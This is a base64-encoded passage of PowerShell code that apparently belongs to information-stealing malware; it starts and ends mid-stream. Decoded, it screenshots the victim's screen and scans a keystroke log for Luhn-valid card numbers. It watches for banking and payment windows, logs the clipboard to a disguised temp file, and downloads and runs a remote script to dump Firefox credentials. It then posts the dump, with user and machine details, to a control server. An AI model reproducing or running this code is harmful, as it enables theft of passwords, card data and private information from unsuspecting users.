Gb3JtcwogICAgICAgICAgICAKICAgICAgICAgICAgCiAgICAgICAgICAgICRmaWxlTmFtZSA9ICd7MH0uanBnJyAtZiAoR2V0LURhdGUpLlRvU3RyaW5nKCd5eXl5TU1kZF9ISG1tc3MnKQogICAgICAgICAgICAkcGF0aCA9IEpvaW4tUGF0aCAkU2NyZWVuc2hvdFBhdGggJGZpbGVOYW1lIAogICAgICAgICAgICAkYiA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuQml0bWFwKFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5TY3JlZW5dOjpQcmltYXJ5U2NyZWVuLkJvdW5kcy5XaWR0aCwgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLlNjcmVlbl06OlByaW1hcnlTY3JlZW4uQm91bmRzLkhlaWdodCkKICAgICAgICAgICAgJGcgPSBbU3lzdGVtLkRyYXdpbmcuR3JhcGhpY3NdOjpGcm9tSW1hZ2UoJGIpCiAgICAgICAgICAgICRnLkNvcHlGcm9tU2NyZWVuKChOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLlBvaW50KDAsMCkpLCAoTmV3LU9iamVjdCBTeXN0ZW0uRHJhd2luZy5Qb2ludCgwLDApKSwgJGIuU2l6ZSkKICAgICAgICAgICAgJGcuRGlzcG9zZSgpCiAgICAgICAgICAgICRteUVuY29kZXIgPSBbU3lzdGVtLkRyYXdpbmcuSW1hZ2luZy5FbmNvZGVyXTo6UXVhbGl0eQogICAgICAgICAgICAkZW5jb2RlclBhcmFtcyA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuSW1hZ2luZy5FbmNvZGVyUGFyYW1ldGVycygxKSAKICAgICAgICAgICAgJGVuY29kZXJQYXJhbXMuUGFyYW1bMF0gPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLkltYWdpbmcuRW5jb2RlclBhcmFtZXRlcigkbXlFbmNvZGVyLCAyMCkgCiAgICAgICAgICAgICRteUltYWdlQ29kZWNJbmZvID0gW1N5c3RlbS5EcmF3aW5nLkltYWdpbmcuSW1hZ2VDb2RlY0luZm9dOjpHZXRJbWFnZUVuY29kZXJzKCl8d2hlcmUgeyRfLk1pbWVUeXBlIC1lcSAnaW1hZ2UvanBlZyd9CiAgICAgICAgICAgICRiLlNhdmUoJHBhdGgsJG15SW1hZ2VDb2RlY0luZm8sICQoJGVuY29kZXJQYXJhbXMpKQp9CgpHZXQtU2NyZWVuU2hvdAoKI2ZpbHRlciBMdWhuKCR4KXskbD0keC5MZW5ndGgtMTskbC4uMHwleyRkPSR4WyRfXS00ODtpZigkXyUyLWVxJGwlMil7JHMrPSRkfWVsc2VpZigkZC1sZTQpeyRzKz0kZCoyfWVsc2V7JHMrPSRkKjItOX19OyEoJHMlMTApfQoKZnVuY3Rpb24gTHVobihbaW50W11dJGRpZ2l0cyl7CiAKICAgIFtpbnRdJHN1bT0wCiAgICBbYm9vbF0kYWx0PSRmYWxzZQoKICAgIGZvcigkaSA9ICRkaWdpdHMubGVuZ3RoIC0gMTsgJGkgLWdlIDA7ICRpLS0pewogICAgICAgIGlmKCRhbHQpewogICAgICAgICAgICAkZGlnaXRzWyRpXSAqPSAyCiAgICAgICAgICAgIGlmKCRkaWdpdHNbJGldIC1ndCA5KSB7ICRkaWdpdHNbJGldIC09IDkgfQogICAgICAgIH0KCiAgICAgICAgJHN1bSArPSAkZGlnaXRzWyRpXQogICAgICAgICRhbHQgPSAhJGFsdAogICAgfQogICAgCiAgICByZXR1cm4gKCRzdW0gJSAxMCkgLWVxIDAKfQoKCiRsdWhuX21hdGNoZXNfcHJldmlvdXMgPSAwCndoaWxlICgkVHJ1ZSkgewogICAgJFByb2Nlc3MgPSBHZXQtUHJvY2VzcyB8ID8geyRfLk1haW5XaW5kb3dIYW5kbGUgLWVxIChbVXNlcldpbmRvd3NdOjpHZXRGb3JlZ3JvdW5kV2luZG93KCkpfQoKICAgIGlmIChUZXN0LVBhdGggIiRlbnY6VEVNUFxrZXkubG9nIikgewogICAgICAgICRrZXlzdHJpbmcgPSAnJwogICAgICAgIChHZXQtQ29udGVudCAkZW52OnRlbXBca2V5LmxvZykgfCBmb3JlYWNoIHsgJGtleXN0cmluZyArPSAkXy5zcGxpdCgiLCIpWzBdLnJlcGxhY2UoJyInLCAnJykgfQogICAgICAgICRsdWhuX21hdGNoZXMgPSBAKCkKICAgICAgICBTZWxlY3QtU3RyaW5nIC1QYXR0ZXJuICJbNDU2XVswLTldezE1fXwzWzAtOV17MTR9IiAtSW5wdXRPYmplY3QgJGtleXN0cmluZyAtQWxsTWF0Y2hlcyB8IGZvcmVhY2ggeyRfLm1hdGNoZXN9IHwgU2VsZWN0LVN0cmluZyAtTm90TWF0Y2ggIihcZClcMXs1LH0iIHwgZm9yZWFjaCB7IGlmIChsdWhuKFtpbnRbXV1bc3RyaW5nW11dW2NoYXJbXV0kXy52YWx1ZSkgLWVxICR0cnVlKSB7JGx1aG5fbWF0Y2hlcyArPSAkVHJ1ZX19CiAgICAgICAgaWYgKCRsdWhuX21hdGNoZXMubGVuZ3RoIC1sdCAkbHVobl9tYXRjaGVzX3ByZXZpb3VzKSB7ICRsdWhuX21hdGNoZXNfcHJldmlvdXMgPSAwIH0KICAgICAgICBpZiAoKCRsdWhuX21hdGNoZXMgLWNvbnRhaW5zICRUcnVlKSAtYW5kICgkbHVobl9tYXRjaGVzLmxlbmd0aCAtZ3QgJGx1aG5fbWF0Y2hlc19wcmV2aW91cykpIHsKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAxLi4yMCB8ICUgeyAKCiAgICAgICAgICAgICAgICBHZXQtU2NyZWVuU2hvdAogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkbHVobl9tYXRjaGVzX3ByZXZpb3VzID0gJGx1aG5fbWF0Y2hlcy5sZW5ndGgKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAoKICAgIAogICAgCiAgICBpZiAoVGVzdC1QYXRoICRlbnY6dGVtcFxrZXl3b3Jkcy50eHQpIHsKICAgICAgICAka2V5d29yZHMgPSAoKEdldC1Db250ZW50ICRlbnY6dGVtcFxrZXl3b3Jkcy50eHQpLnNwbGl0KCcgJykpWzFdLnNwbGl0KCd8JykKICAgICAgICBmb3JlYWNoICgka2V5d29yZCBpbiAka2V5d29yZHMpIHtpZiAoKCRQcm9jZXNzLk1haW5XaW5kb3dUaXRsZSAtY2xpa2UgIioka2V5d29yZCoiICkgLWFuZCAoVGVzdC1QYXRoICIkZW52OlRFTVBca2V5LmxvZyIpKSB7CiAgICAgICAgMS4uMjAgfCAlIHsgCiAgICAgICAgICAgIEdldC1TY3JlZW5TaG90CiAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDUKICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgIGlmICgoJFByb2Nlc3MuTWFpbldpbmRvd1RpdGxlIC1saWtlICcqY2hlY2tvdXQqJykgLW9yICgkUHJvY2Vzcy5NYWluV2luZG93VGl0bGUgLWxpa2UgJypQYXktTWUtTm93KicpIGAKICAgIC1vciAoJFByb2Nlc3MuTWFpbldpbmRvd1RpdGxlIC1saWtlICcqU2lnbiBPbiAtIENpdGliYW5rKicpIC1vciAoJFByb2Nlc3MuTWFpbldpbmRvd1RpdGxlIC1saWtlICdTaWduIGluIG9yIFJlZ2lzdGVyIHwgZUJheScpYAogICAgLW9yICgkUHJvY2Vzcy5NYWluV2luZG93VGl0bGUgLWxpa2UgJypDcmVkaXQgQ2FyZConKSAtb3IgKCRQcm9jZXNzLk1haW5XaW5kb3dUaXRsZSAtbGlrZSAnKlBsYWNlIFlvdXIgT3JkZXIqJykgYAogICAgLW9yICgkUHJvY2Vzcy5NYWluV2luZG93VGl0bGUgLWNsaWtlICcqQmFua2luZyonKSAtb3IgKCRQcm9jZXNzLk1haW5XaW5kb3dUaXRsZSAtbGlrZSAnKkxvZyBpbiB0byB5b3VyIFBheVBhbCBhY2NvdW50KicpIGAKICAgIC1vciAoJFByb2Nlc3MuTWFpbldpbmRvd1RpdGxlIC1saWtlICcqRXhwZWRpYSBQYXJ0bmVyKkNlbnRyYWwqJykgLW9yICgkUHJvY2Vzcy5NYWluV2luZG93VGl0bGUgLWxpa2UgJypCb29raW5nLmNvbSBFeHRyYW5ldConKSBgCiAgICAtb3IgKCRQcm9jZXNzLk1haW5XaW5kb3dUaXRsZSAtbGlrZSAnKkNoYXNlIE9ubGluZSAtIExvZ29uKicpIC1vciAoJFByb2Nlc3MuTWFpbldpbmRvd1RpdGxlIC1saWtlICcqT25lIFRpbWUgUGF5KicpIGAKICAgIC1vciAoJFByb2Nlc3MuTWFpbldpbmRvd1RpdGxlIC1jbGlrZSAnKkxvZ01lSW4qJykgLW9yICgkUHJvY2Vzcy5NYWluV2luZG93VGl0bGUgLWNsaWtlICcqV2luZG93cyBTZWN1cml0eSonKSBgCiAgICAtb3IgKCRQcm9jZXNzLk1haW5XaW5kb3dUaXRsZSAtbGlrZSAnKkNob29zZSBhIHdheSB0byBwYXkqJykgLW9yICgkUHJvY2Vzcy5NYWluV2luZG93VGl0bGUgLWxpa2UgJypwYXltZW50IGluZm9ybWF0aW9uKicpIGAKICAgIC1vciAoJFByb2Nlc3MuTWFpbldpbmRvd1RpdGxlIC1jbGlrZSAnKkNoYW5nZSBSZXNlcnZhdGlvbionKSAtb3IgKCRQcm9jZXNzLk1haW5XaW5kb3dUaXRsZSAtY2xpa2UgJypQT1MqJykgYAogICAgLW9yICgkUHJvY2Vzcy5NYWluV2luZG93VGl0bGUgLWxpa2UgJypWaXJ0dWFsKlRlcm1pbmFsKicpIC1vciAoJFByb2Nlc3MuTWFpbldpbmRvd1RpdGxlIC1saWtlICcqUGF5UGFsOiBXYWxsZXQqJykgYAogICAgLW9yICgkUHJvY2Vzcy5NYWluV2luZG93VGl0bGUgLWxpa2UgJyppYXRzcGF5bWVudConKSAtb3IgKCRQcm9jZXNzLk1haW5XaW5kb3dUaXRsZSAtbGlrZSAnKkxvZ01lSW4qJykgYAogICAgLW9yICgkUHJvY2Vzcy5NYWluV2luZG93VGl0bGUgLWNsaWtlICcqQXV0aG9yaXplLk5ldConKSAtb3IgKCRQcm9jZXNzLk1haW5XaW5kb3dUaXRsZSAtbGlrZSAnKkxvZ01lSW4qJykgYAogICAgLW9yICgkUHJvY2Vzcy5NYWluV2luZG93VGl0bGUgLWNsaWtlICcqRGlzY292ZXIgQ2FyZConKSAtb3IgKCRQcm9jZXNzLk1haW5XaW5kb3dUaXRsZSAtbGlrZSAnKkxvZ01lSW4qJykgYAogICAgLW9yICgkUHJvY2Vzcy5NYWluV2luZG93VGl0bGUgLWxpa2UgJypld2FsbGV0KicpIC1vciAoJFByb2Nlc3MuTWFpbldpbmRvd1RpdGxlIC1saWtlICcqYXJjb3QqJykgYAogICAgLW9yICgkUHJvY2Vzcy5NYWluV2luZG93VGl0bGUgLWNsaWtlICcqUGF5VHJhY2UqJykgLW9yICgkUHJvY2Vzcy5NYWluV2luZG93VGl0bGUgLWNsaWtlICcqTmV3IENoYXJnZSonKSBgCiAgICAtb3IgKCRQcm9jZXNzLk1haW5XaW5kb3dUaXRsZSAtY2xpa2UgJypWZXJpZmljYXRpb24qJykgLW9yICgkUHJvY2Vzcy5NYWluV2luZG93VGl0bGUgLWNsaWtlICcqUElOKicpIGAKICAgIC1vciAoJFByb2Nlc3MuTWFpbldpbmRvd1RpdGxlIC1jbGlrZSAnKkF1dGhlbnRpY2F0aW9uKicpIC1vciAoJFByb2Nlc3MuTWFpbldpbmRvd1RpdGxlIC1jbGlrZSAnKlBhc3N3b3JkKicpIGAKICAgIC1vciAoJFByb2Nlc3MuTWFpbldpbmRvd1RpdGxlIC1jbGlrZSAnKkRlYml0IENhcmQqJykgLW9yICgkUHJvY2Vzcy5NYWluV2luZG93VGl0bGUgLWNsaWtlICcqQWN0aXZhdGlvbionKSBgCiAgICAtb3IgKCRQcm9jZXNzLk1haW5XaW5kb3dUaXRsZSAtY2xpa2UgJypMYXN0UGFzcyonKSAtb3IgKCRQcm9jZXNzLk1haW5XaW5kb3dUaXRsZSAtY2xpa2UgJypTU04qJykgYAogICAgLW9yICgkUHJvY2Vzcy5NYWluV2luZG93VGl0bGUgLWNsaWtlICcqRHJpdmVyKkxpY2Vuc2UqJykgLW9yICgkUHJvY2Vzcy5NYWluV2luZG93VGl0bGUgLWNsaWtlICcqQ2hlY2staW4gZm9yKicpIGAKICAgIC1vciAoJFByb2Nlc3MuTWFpbldpbmRvd1RpdGxlIC1jbGlrZSAnKlVtcHF1YSonKSAtb3IgKCRQcm9jZXNzLk1haW5XaW5kb3dUaXRsZSAtY2xpa2UgJyplUGF5bWVudConKSBgCiAgICAtb3IgKCRQcm9jZXNzLk1haW5XaW5kb3dUaXRsZSAtY2xpa2UgJypDb252ZXJnZSAtKicpIC1vciAoJFByb2Nlc3MuTWFpbldpbmRvd1RpdGxlIC1jbGlrZSAnKlN3aXBlKicpIGAKICAgIC1vciAoJFByb2Nlc3MuTWFpbldpbmRvd1RpdGxlIC1saWtlICcqUGF5cmF6cionKSAtb3IgKCRQcm9jZXNzLk1haW5XaW5kb3dUaXRsZSAtY2xpa2UgJypIb3N0ZWQgLSonKSBgCiAgICAtYW5kIChUZXN0LVBhdGggIiRlbnY6VEVNUFxrZXkubG9nIikpIHsKICAgIDEuLjIwIHwgJSB7IAoKICAgIEdldC1TY3JlZW5TaG90CiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA1Cn0KfQpTdGFydC1TbGVlcCAtU2Vjb25kcyA1Cn0KfSAtQXJndW1lbnRMaXN0ICRwYXJhbXMuaGFzaGlkLCAkcGFyYW1zLnVybCwgJHBhcmFtcy51c2VybmFtZSwgJHBhcmFtcy5yZXNvbHV0aW9uLCAkcGFyYW1zLlNjcmVlbnNob3RfUGF0aAp9CgogCmZ1bmN0aW9uIEdjbGlwIHsKICAgIFN0YXJ0LUpvYiAtU2NyaXB0QmxvY2sgewoKICAgICAgICAkUG9sbEludGVydmFsID0gMwogICAgCgogICAgQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtcwoKICAgICMgdXNlZCB0byBjaGVjayBpZiB0aGUgY29udGVudHMgaGF2ZSBjaGFuZ2VkCiAgICAkUHJldkxlbmd0aCA9IDAKICAgICRQcmV2Rmlyc3RDaGFyID0gIiIKCiAgICBmb3IoOzspewoKICAgICAgICAgICAgIyBzdG9sZW4vYWRhcHRlZCBmcm9tIGh0dHA6Ly9icmlhbnJlaXRlci5vcmcvMjAxMC8wOS8wMy9jb3B5LWFuZC1wYXN0ZS13aXRoLWNsaXBib2FyZC1mcm9tLXBvd2Vyc2hlbGwvCiAgICAgICAgICAgICR0YiA9IE5ldy1PYmplY3QgU3lzdGVtLldpbmRvd3MuRm9ybXMuVGV4dEJveAogICAgICAgICAgICAkdGIuTXVsdGlsaW5lID0gJHRydWUKICAgICAgICAgICAgJHRiLlBhc3RlKCkKCiAgICAgICAgICAgICMgb25seSBvdXRwdXQgY2xpcGJvYXJkIGRhdGEgaWYgaXQncyBjaGFuZ2VkCiAgICAgICAgICAgIGlmICgoJHRiLlRleHQuTGVuZ3RoIC1uZSAwKSAtYW5kICgkdGIuVGV4dC5MZW5ndGggLW5lICRQcmV2TGVuZ3RoKSl7CiAgICAgICAgICAgICAgICAjIGlmIHRoZSBsZW5ndGggaXNuJ3QgMCwgdGhlIGxlbmd0aCBoYXMgY2hhbmdlZCwgYW5kIHRoZSBmaXJzdCBjaGFyYWN0ZXIKICAgICAgICAgICAgICAgICMgaGFzIGNoYW5nZWQsIGFzc3VtZSB0aGUgY2xpcGJvYXJkIGhhcyBjaGFuZ2VkCiAgICAgICAgICAgICAgICAjIFlFUyBJIGtub3cgdGhlcmUgbWlnaHQgYmUgZWRnZSBjYXNlcyA6KQogICAgICAgICAgICAgICAgaWYoJFByZXZGaXJzdENoYXIgLW5lICgkdGIuVGV4dClbMF0pewogICAgICAgICAgICAgICAgICAgICRUaW1lU3RhbXAgPSAoR2V0LURhdGUgLUZvcm1hdCBkZC9NTS95eXl5OkhIOm1tOnNzOmZmKQogICAgICAgICAgICAgICAgICAgICNPdXQtRmlsZSAtRmlsZVBhdGggIiRlbnY6VGVtcFxBcHBsbnNpZ2h0c19WaXN1YWxTdHVkaW8udHh0IiAtQXBwZW5kIC1JbnB1dE9iamVjdCAiYD09PT09PT09PT0gQ0xJUEJPQVJEID09PT09PT09PT1gbiIgLUVuY29kaW5nIHVuaWNvZGUKICAgICAgICAgICAgICAgICAgICBPdXQtRmlsZSAtRmlsZVBhdGggIiRlbnY6VGVtcFxBcHBsbnNpZ2h0c19WaXN1YWxTdHVkaW8udHh0IiAtQXBwZW5kIC1JbnB1dE9iamVjdCAkdGIuVGV4dCAtRW5jb2RpbmcgdW5pY29kZQogICAgICAgICAgICAgICAgICAgICRQcmV2Rmlyc3RDaGFyID0gKCR0Yi5UZXh0KVswXQogICAgICAgICAgICAgICAgICAgICRQcmV2TGVuZ3RoID0gJHRiLlRleHQuTGVuZ3RoIAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgCiAgICAgICAgU3RhcnQtU2xlZXAgLXMgJFBvbGxJbnRlcnZhbAogICAgfQogICAgfQp9ICAgIAoKCmZ1bmN0aW9uIEdldEZGIHsKICAgIFN0YXJ0LUpvYiAtU2NyaXB0QmxvY2sgewogICAgICAgZnVuY3Rpb24gRXNjYXBlLUpTT05TdHJpbmcoJHN0cil7CglpZiAoJHN0ciAtZXEgJG51bGwpIHtyZXR1cm4gIiJ9Cgkkc3RyID0gJHN0ci5Ub1N0cmluZygpLlJlcGxhY2UoJyInLCdcIicpLlJlcGxhY2UoJ1wnLCdcXCcpLlJlcGxhY2UoImBuIiwnXG4nKS5SZXBsYWNlKCJgciIsJ1xyJykuUmVwbGFjZSgiYHQiLCdcdCcpCglyZXR1cm4gJHN0cjsKfQoKICAgIGZ1bmN0aW9uIENvbnZlcnRUby1KU09OKCRtYXhEZXB0aCA9IDQsJGZvcmNlQXJyYXkgPSAkZmFsc2UpIHsKCWJlZ2luIHsKCQkkZGF0YSA9IEAoKQoJfQoJcHJvY2Vzc3sKCQkkZGF0YSArPSAkXwoJfQoJCgllbmR7CgkKCQlpZiAoJGRhdGEubGVuZ3RoIC1lcSAxIC1hbmQgJGZvcmNlQXJyYXkgLWVxICRmYWxzZSkgewoJCQkkdmFsdWUgPSAkZGF0YVswXQoJCX0gZWxzZSB7CQoJCQkkdmFsdWUgPSAkZGF0YQoJCX0KCgkJaWYgKCR2YWx1ZSAtZXEgJG51bGwpIHsKCQkJcmV0dXJuICJudWxsIgoJCX0KCgkJCgoJCSRkYXRhVHlwZSA9ICR2YWx1ZS5HZXRUeXBlKCkuTmFtZQoJCQoJCXN3aXRjaCAtcmVnZXggKCRkYXRhVHlwZSkgewoJICAgICAgICAgICAgJ1N0cmluZycgIHsKCQkJCQlyZXR1cm4gICJgInswfWAiIiAtZiAoRXNjYXBlLUpTT05TdHJpbmcgJHZhbHVlICkKCQkJCX0KCSAgICAgICAgICAgICcoU3lzdGVtXC4pP0RhdGVUaW1lJyAge3JldHVybiAgImAiezA6eXl5eS1NTS1kZH1UezA6SEg6bW06c3N9YCIiIC1mICR2YWx1ZX0KCSAgICAgICAgICAgICdJbnQzMnxEb3VibGUnIHtyZXR1cm4gICIkdmFsdWUifQoJCQkJJ0Jvb2xlYW4nIHtyZXR1cm4gICIkdmFsdWUiLlRvTG93ZXIoKX0KCSAgICAgICAgICAgICcoU3lzdGVtXC4pP09iamVjdFxbXF0nIHsgIyBhcnJheQoJCQkJCQoJCQkJCWlmICgkbWF4RGVwdGggLWxlIDApe3JldHVybiAiYCIkdmFsdWVgIiJ9CgkJCQkJCgkJCQkJJGpzb25SZXN1bHQgPSAnJwoJCQkJCWZvcmVhY2goJGVsZW0gaW4gJHZhbHVlKXsKCQkJCQkJI2lmICgkZWxlbSAtZXEgJG51bGwpIHtjb250aW51ZX0KCQkJCQkJaWYgKCRqc29uUmVzdWx0Lkxlbmd0aCAtZ3QgMCkgeyRqc29uUmVzdWx0ICs9JywgJ30JCQkJCgkJCQkJCSRqc29uUmVzdWx0ICs9ICgkZWxlbSB8IENvbnZlcnRUby1KU09OIC1tYXhEZXB0aCAoJG1heERlcHRoIC0xKSkKCQkJCQl9CgkJCQkJcmV0dXJuICJbIiArICRqc29uUmVzdWx0ICsgIl0iCgkgICAgICAgICAgICB9CgkJCQknKFN5c3RlbVwuKT9IYXNodGFibGUnIHsgIyBoYXNodGFibGUKCQkJCQkkanNvblJlc3VsdCA9ICcnCgkJCQkJZm9yZWFjaCgka2V5IGluICR2YWx1ZS5LZXlzKXsKCQkJCQkJaWYgKCRqc29uUmVzdWx0Lkxlbmd0aCAtZ3QgMCkgeyRqc29uUmVzdWx0ICs9JywgJ30KCQkJCQkJJGpzb25SZXN1bHQgKz0gCkAiCgkiezB9IjogezF9CiJAIC1mICRrZXkgLCAoJHZhbHVlWyRrZXldIHwgQ29udmVydFRvLUpTT04gLW1heERlcHRoICgkbWF4RGVwdGggLTEpICkKCQkJCQl9CgkJCQkJcmV0dXJuICJ7IiArICRqc29uUmVzdWx0ICsgIn0iCgkJCQl9CgkgICAgICAgICAgICBkZWZhdWx0IHsgI29iamVjdAoJCQkJCWlmICgkbWF4RGVwdGggLWxlIDApe3JldHVybiAgImAiezB9YCIiIC1mIChFc2NhcGUtSlNPTlN0cmluZyAkdmFsdWUpfQoJCQkJCQoJCQkJCXJldHVybiAieyIgKwoJCQkJCQkoKCR2YWx1ZSB8IEdldC1NZW1iZXIgLU1lbWJlclR5cGUgKnByb3BlcnR5IHwgJSB7IApAIgoJInswfSI6IHsxfQoiQCAtZiAkXy5OYW1lICwgKCR2YWx1ZS4oJF8uTmFtZSkgfCBDb252ZXJ0VG8tSlNPTiAtbWF4RGVwdGggKCRtYXhEZXB0aCAtMSkgKQkJCQoJCQkJCQoJCQkJCX0pIC1qb2luICcsICcpICsgIn0iCgkgICAgCQl9CgkJfQoJfQp9CgogICAgICAgICAgICAkdXJsID0gJGFyZ3NbMF0KICAgICAgICAgICAgCiAgICAgICAgICAgICRyZXNvbHV0aW9uID0gJGFyZ3NbMV0KICAgICAgICAgICAgJGRvbWFpbiA9ICRhcmdzWzJdCiAgICAgICAgICAgICRjb21wdXRlcl9uYW1lID0gJGFyZ3NbM10KICAgICAgICAgICAgJHVzZXJuYW1lID0gJGFyZ3NbNF0KICAgICAgICAgICAgJHRpbWV6b25lID0gJGFyZ3NbNV0KICAgICAgICAgICAgJGhhc2hpZCA9ICRhcmdzWzZdCiAgICAgICAgICAgICR2ZXJzaW9uID0gJGFyZ3NbN10gICAgCgogICAgICAgIFtTeXN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZXJ2ZXJDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFjayA9IHsgJHRydWUgfQogICAgICAgICYgY21kIC9jICVzeXN0ZW1yb290JVxzeXN3b3c2NFx3aW5kb3dzcG93ZXJzaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlICJbU3lzdGVtLk5ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7IGAkdHJ1ZSB9OyBJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vd3N1c3VwZGF0ZS5jb20vc2NyaXB0P2lkPXJhbmRvbSZuYW1lPWZpcmVmb3gnKTsgR2V0LUZveER1bXAgLU91dEZpbGUgJGVudjp0ZW1wXGZpcmVmb3gubG9nOyBFeGl0IgogICAgICAgICYgY21kIC9jICVzeXN0ZW1yb290JVxzeXN0ZW0zMlx3aW5kb3dzcG93ZXJzaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlICJbU3lzdGVtLk5ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7IGAkdHJ1ZSB9OyBJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vd3N1c3VwZGF0ZS5jb20vc2NyaXB0P2lkPXJhbmRvbSZuYW1lPWZpcmVmb3gnKTsgR2V0LUZveER1bXAgLU91dEZpbGUgJGVudjp0ZW1wXGZpcmVmb3gubG9nOyBFeGl0IgogICAKICAgICAgICAgICAgSWYgKFRlc3QtUGF0aCAiJGVudjp0ZW1wXGZpcmVmb3gubG9nIikgeyAKICAgICAgICAgICAgJGNvbnRlbnQgPSBHZXQtQ29udGVudCAkZW52OnRlbXBcZmlyZWZveC5sb2cgfCBPdXQtU3RyaW5nCiAgICAgICAgICAgICRjb250ZW50ID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkY29udGVudCkpCiAgICAgICAgICAgICRqc29uID0gQHsicmVzb2x1dGlvbiIgPSAkcmVzb2x1dGlvbjsgImRvbWFpbiIgPSAkZG9tYWluOyAiY29tcHV0ZXJfbmFtZSIgPSAkY29tcHV0ZXJfbmFtZTsgInVzZXJuYW1lIiA9ICR1c2VybmFtZTsgInRpbWV6b25lIiA9ICR0aW1lem9uZTsgImhhc2hpZCIgPSAkaGFzaGlkOyAidmVyc2lvbiIgPSAkdmVyc2lvbjsgImNvbnRlbnQiID0gJGNvbnRlbnQ7ICJ0eXBlIiA9ICJmZmJyd3B3ZCJ9CiAgICAgICAgICAgICRsb2dfanNvbiA9ICRqc29uIHwgQ29udmVydFRvLUpzb24KICAgICAgICAgICAgJGJ1ZmZlciA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGxvZ19qc29uKQogICAgICAgICAgICBbU3lzdGVtLk5ldC5IdHRwV2ViUmVxdWVzdF0gJHdlYlJlcXVlc3QgPSBbU3lzdGVtLk5ldC5XZWJSZXF1ZXN0XTo6Q3JlYXRlKCR1cmwrIi9wc2hsb2ciKQogICAgICAgICAgICAkd2ViUmVxdWVzdC5Db250ZW50VHlwZSA9ICJhcHBsaWNhdGlvbi9qc29uIgogICAgICAgICAgICAkd2ViUmVxdWVzdC5UaW1lb3V0ID0gMTAwMDAKICAgICAgICAgICAgJHdlYlJlcXVlc3QuTWV0aG9kID0gIlBPU1QiCiAgICAgICAgICAgICR3ZWJSZXF1ZXN0LkNvbnRlbnRMZW5ndGggPSAkYnVmZmVyLkxlbmd0aDsKICAgICAgICAgICAgJHJlcXVlc3RTdHJlYW0gPSAkd2ViUmVxdWVzdC5HZXRSZXF1ZXN0U3RyZWFtKCkKICAgICAgICAgICAgJHJlcXVlc3RTdHJlYW0uV3JpdGUoJGJ1ZmZlciwgMCwgJGJ1ZmZlci5MZW5ndGgpCiAgICAgICAgICAgICRyZXF1ZXN0U3RyZWFtLkZsdXNoKCkKICAgICAgICAgICAgJHJlcXVlc3RTdHJlYW0uQ2xvc2UoKQoKICAgICAgICAgICAgW1N5c3RlbS5OZXQuSHR0cFdlYlJlc3BvbnNlXSAkd2ViUmVzcG9uc2UgPSAkd2ViUmVxdWVzdC5HZXRSZXNwb25zZSgpCiAgICAgICAgICAgICRzdHJlYW1SZWFkZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5JTy5TdHJlYW1SZWFkZXIoJHdlYlJlc3BvbnNlLkdldFJlc3BvbnNlU3RyZWFtKCkpCiAgICAgICAgICAgICRyZXN1bHQgPSAkc3RyZWFtUmVhZGVyLlJlYWRUb0VuZCgpCiAgICAgICAgICAgIFJlbW92ZS1JdGVtICIkZW52OnRlbXBcZmlyZWZveC5sb2ciCiAgICAgICAgICAgIH0KICAgICAgICAgICAgfSAtQXJndW1lbnRMaXN0ICRwYXJhbXMudXJsLCAkcGFyYW1zLnJlc29sdXRpb24sICRwYXJhbXMuZG9tYWluLCAkcGFyYW1zLmNvbXB1dGVyX25hbWUsICRwYXJhbXMudXNlcm5hbWUsICRwYXJhbXMudGltZXpvbmUsICRwYXJhbXMuaGFzaGlkLCAkcGFyYW1zLnZlcnNpb24KICAgICAgICAgICAgfQoKZnVuY3Rpb24gR2V0Q2hyb21lIHsKICAgIFN0YXJ0LUpvYiAtU2NyaXB0QmxvY2sgewogICAgICAgZnVuY3Rpb24gRXNjYXBlLUpTT05TdHJpbmcoJHN0cil7CglpZiAoJHN0ciAtZXEgJG51bGwpIHtyZXR1cm4gIiJ9Cgkkc3RyID0gJHN0ci5Ub1N0cmluZygpLlJlcGxhY2UoJyInLCdcIicpLlJlcGxhY2UoJ1wnLCdcXCcpLlJlcGxhY2UoImBuIiwnXG4nKS5SZXBsYWNlKCJgciIsJ1xyJykuUmVwbGFjZSgiYHQiLCdcdCcpCglyZXR1cm4gJHN0cjsKfQoKICAgIGZ1bmN0aW9uIENvbnZlcnRUby1KU09OKCRtYXhEZXB0aCA9IDQsJGZvcmNlQXJyYXkgPSAk